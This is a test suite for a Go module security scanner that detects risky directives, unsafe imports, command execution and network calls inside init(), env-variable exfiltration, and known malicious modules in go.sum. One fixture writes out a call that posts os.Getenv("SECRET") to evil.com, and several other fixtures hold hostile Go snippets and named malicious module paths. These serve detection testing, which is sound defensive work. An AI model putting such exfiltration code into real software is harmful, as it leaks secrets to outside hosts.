import { describe, it, expect } from "vitest";
import { scanGoContent, scanGoSumContent, isGoFile, GO_PATTERNS } from "../go-scanner.js";
import { matchPatternInContent } from "../patterns.js";

function normalizePatternMatches(
  content: string,
  matches: ReturnType<typeof matchPatternInContent>,
) {
  const lineStarts = [0];
  for (let index = 0; index < content.length; index++) {
    if (content[index] === "\n") lineStarts.push(index + 1);
  }

  return matches.map((hit) => {
    const matchIndex = hit.match.index ?? 0;
    const absoluteStart = hit.match.input === content
      ? matchIndex
      : (lineStarts[hit.line - 1] ?? 0) + matchIndex;
    return { line: hit.line, start: absoluteStart, evidence: hit.text };
  });
}

describe("Go Module Scanner", () => {
  it("should identify Go-related files", () => {
    expect(isGoFile("go.mod")).toBe(true);
    expect(isGoFile("go.sum")).toBe(true);
    expect(isGoFile("main.go")).toBe(true);
    expect(isGoFile("handler_test.go")).toBe(true);
    expect(isGoFile("package.json")).toBe(false);
  });

  describe("go.mod scanning", () => {
    it("should detect replace directives", () => {
      const content = "module example.com/app\n\ngo 1.21\n\nreplace example.com/lib => ../my-fork";
      const findings = scanGoContent(content, "go.mod", "mod");
      expect(findings.some((f) => f.rule === "GO_REPLACE_DIRECTIVE")).toBe(true);
    });

    it("should detect retract directives", () => {
      const content = "module example.com/app\n\ngo 1.21\n\nretract v1.0.0";
      const findings = scanGoContent(content, "go.mod", "mod");
      expect(findings.some((f) => f.rule === "GO_RETRACT_DIRECTIVE")).toBe(true);
    });

    it("should not flag clean go.mod", () => {
      const content = [
        "module example.com/app",
        "",
        "go 1.21",
        "",
        "require (",
        "    github.com/gin-gonic/gin v1.9.1",
        ")",
      ].join("\n");
      const findings = scanGoContent(content, "go.mod", "mod");
      expect(findings).toHaveLength(0);
    });
  });

  describe("Go source scanning", () => {
    it("should detect CGo import", () => {
      const content = 'package main\n\nimport "C"\n\nfunc main() {}';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_CGO_IMPORT")).toBe(true);
    });

    it("should detect unsafe import", () => {
      const content = 'package main\n\nimport "unsafe"\n\nfunc main() {}';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_UNSAFE_IMPORT")).toBe(true);
    });

    it("should detect plugin.Open", () => {
      const content = 'package main\n\nfunc load() { p, _ := plugin.Open("module.so") }';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_PLUGIN_LOAD")).toBe(true);
    });

    it("should detect os/exec usage", () => {
      const content = 'package main\n\nimport "os/exec"\n\nfunc run() { exec.Command("ls") }';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_OS_EXEC")).toBe(true);
    });

    it("should detect command execution inside init", () => {
      const findings = scanGoContent(
        'package main\nfunc init() { exec.Command("whoami") }',
        "main.go",
        "source",
      );
      expect(findings.some((f) => f.rule === "GO_INIT_EXEC")).toBe(true);
    });

    it("should detect network access inside init", () => {
      const findings = scanGoContent(
        'package main\nfunc init() { http.Get("https://example.com") }',
        "main.go",
        "source",
      );
      expect(findings.some((f) => f.rule === "GO_INIT_NETWORK")).toBe(true);
    });

    it("does not correlate calls after the closing init brace", () => {
      const content = [
        "package main",
        'func init() { prepare() } func later() { exec.Command("x"); http.Get(url) }',
      ].join("\n");
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_INIT_EXEC")).toBe(false);
      expect(findings.some((f) => f.rule === "GO_INIT_NETWORK")).toBe(false);
    });

    it("should detect env exfiltration pattern", () => {
      const content = 'func exfil() {\n    http.Post("https://evil.com", "text/plain", strings.NewReader(os.Getenv("SECRET")))\n}';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_ENV_EXFIL")).toBe(true);
    });

    it("should detect env access before a network call", () => {
      const content = 'func exfil() { value := os.Getenv("SECRET"); http.Client{} }';
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_ENV_EXFIL")).toBe(true);
    });

    it("does not report isolated or line-terminator-separated exfil signals", () => {
      const content = [
        'value := os.Getenv("SECRET")',
        "os.Getenv\rhttp.Post",
        "http.Post\ros.Getenv",
      ].join("\n");
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings.some((f) => f.rule === "GO_ENV_EXFIL")).toBe(false);
    });

    it("should not flag clean Go source", () => {
      const content = [
        "package main",
        "",
        'import "fmt"',
        "",
        "func main() {",
        '    fmt.Println("Hello, World!")',
        "}",
      ].join("\n");
      const findings = scanGoContent(content, "main.go", "source");
      expect(findings).toHaveLength(0);
    });
  });

  describe("go.sum scanning", () => {
    // Real bundled IOC (BufferZoneCorp sleeper Go modules, go: bare-name entry)
    const MALICIOUS_MODULE = "github.com/BufferZoneCorp/go-metrics-sdk";

    it("should flag a go.sum module matching a go: IOC (reported once)", () => {
      const content = [
        `${MALICIOUS_MODULE} v1.0.0 h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=`,
        `${MALICIOUS_MODULE} v1.0.0/go.mod h1:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=`,
        "github.com/gin-gonic/gin v1.9.1 h1:CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=",
      ].join("\n");
      const findings = scanGoSumContent(content, "go.sum");
      const hits = findings.filter((f) => f.rule === "GO_MALICIOUS_MODULE");
      // Two hash lines for the same module, but reported once.
      expect(hits).toHaveLength(1);
      expect(hits[0]?.severity).toBe("critical");
      expect(hits[0]?.category).toBe("malware");
      expect(hits[0]?.description).toContain(MALICIOUS_MODULE);
    });

    it("does not flag the verified a2sv coursework repo while retaining the real campaign", () => {
      const legitimate = "github.com/amantsehay/a2sv-go-course";
      const attacker = "github.com/glacialspring/go-winsparkle";
      const content = [
        `${legitimate} v1.0.0 h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=`,
        `${attacker} v1.0.0 h1:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=`,
      ].join("\n");

      const hits = scanGoSumContent(content, "go.sum").filter(
        (finding) => finding.rule === "GO_MALICIOUS_MODULE",
      );
      expect(hits).toHaveLength(1);
      expect(hits[0]?.match).toBe(`${attacker}@v1.0.0`);
      expect(hits[0]?.severity).toBe("critical");
    });

    it("should not flag a clean go.sum (FP-safety)", () => {
      const content = [
        "github.com/gin-gonic/gin v1.9.1 h1:xxxx=",
        "github.com/gin-gonic/gin v1.9.1/go.mod h1:yyyy=",
        "golang.org/x/sys v0.20.0 h1:zzzz=",
      ].join("\n");
      expect(scanGoSumContent(content, "go.sum")).toHaveLength(0);
    });

    it("should not crash on blank or malformed lines", () => {
      expect(() => scanGoSumContent("\n   \nbadline\n", "go.sum")).not.toThrow();
      expect(scanGoSumContent("", "go.sum")).toHaveLength(0);
    });
  });

  it("should include line numbers", () => {
    const content = "module x\n\ngo 1.21\n\nreplace x => ../y";
    const findings = scanGoContent(content, "go.mod", "mod");
    expect(findings.find((f) => f.rule === "GO_REPLACE_DIRECTIVE")?.line).toBe(5);
  });

  it("matches the legacy regex verdict on Go correlation edge cases", () => {
    const cases: Array<[string, string[]]> = [
      ["GO_INIT_EXEC", [
        "func init() { exec.Command(one); exec.Command(two) }",
        "func first init() func init() exec.Command(one) exec.Command(two)",
        "func init() { done() } exec.Command(cmd)",
        "func INIT ( ) exec.Command(one) EXEC.Command(two)",
        "func init() exec.Command(one)\rexec.Command(two)",
        "func init() exec.Command(one)\u2028exec.Command(two)",
        "func init() exec.Command(one)\u2029exec.Command(two)",
        "before\nfunc init() exec.Command(one) exec.Command(two)",
      ]],
      ["GO_INIT_NETWORK", [
        "func init() http.NewRequest() net.Dial(addr) http.Post(url)",
        "func first init() func init() http.Get(one) http.Post(two)",
        "func init() { done() } net.Dial(addr)",
        "func init() http.Get(one)\rnet.Dial(two)",
        "func init() http.Get(one)\u2028net.Dial(two)",
        "func init() http.Get(one)\u2029net.Dial(two)",
      ]],
      ["GO_ENV_EXFIL", [
        "os.Getenv(name); http.Foo() x net.Dial(addr)",
        "os.GetenvValue then http.Post(url)",
        "http.Foo(); os.GetenvValue",
        "http.Post(url); os.GetenvValue",
        "http.Post(one); os.Getenv(name) x os.GetenvValue",
        "os.Getenv(name) http.Get(one) http.Foo() net.Dial(two)",
        "os.Getenv\rhttp.Post",
        "os.Getenv\u2028http.Post",
        "os.Getenv\u2029http.Post",
        "http.Post\ros.GetenvValue",
        "http.Post\u2028os.GetenvValue",
        "http.Post\u2029os.GetenvValue",
        "before\nhttp.Post(url) os.GetenvValue x os.GetenvOther",
      ]],
    ];

    for (const [rule, sources] of cases) {
      const structural = GO_PATTERNS.find((entry) => entry.rule === rule)!;
      const regex = { ...structural, correlatedMatcher: undefined };
      for (const content of sources) {
        const expected = normalizePatternMatches(
          content,
          matchPatternInContent(regex, content, "i"),
        );
        const actual = normalizePatternMatches(
          content,
          matchPatternInContent(structural, content, "i"),
        );
        expect(actual, `${rule}: ${JSON.stringify(content)}`).toEqual(expected);
      }
    }
  });

  it("fully scans 5 MiB Go correlation near misses in linear time", { timeout: 15_000 }, () => {
    const size = 5 * 1024 * 1024;
    const cases: Array<[string, string]> = [
      ["GO_INIT_EXEC", "func init()x"],
      ["GO_INIT_NETWORK", "func init()x"],
      ["GO_ENV_EXFIL", "os.Getenv x"],
    ];
    const started = Date.now();

    for (const [rule, unit] of cases) {
      const pattern = GO_PATTERNS.find((entry) => entry.rule === rule)!;
      const content = unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
      const hits = matchPatternInContent(pattern, content, "i");
      expect(hits, rule).toHaveLength(0);
      expect(hits.coverage.complete, rule).toBe(true);
      expect(hits.coverage.regexAttempts, rule).toBe(1);
    }

    expect(Date.now() - started).toBeLessThan(5_000);
  });

  it("should have patterns array", () => {
    expect(GO_PATTERNS.length).toBeGreaterThan(5);
    for (const p of GO_PATTERNS) {
      expect(p.rule).toBeTruthy();
      expect(p.severity).toBeTruthy();
    }
  });
});
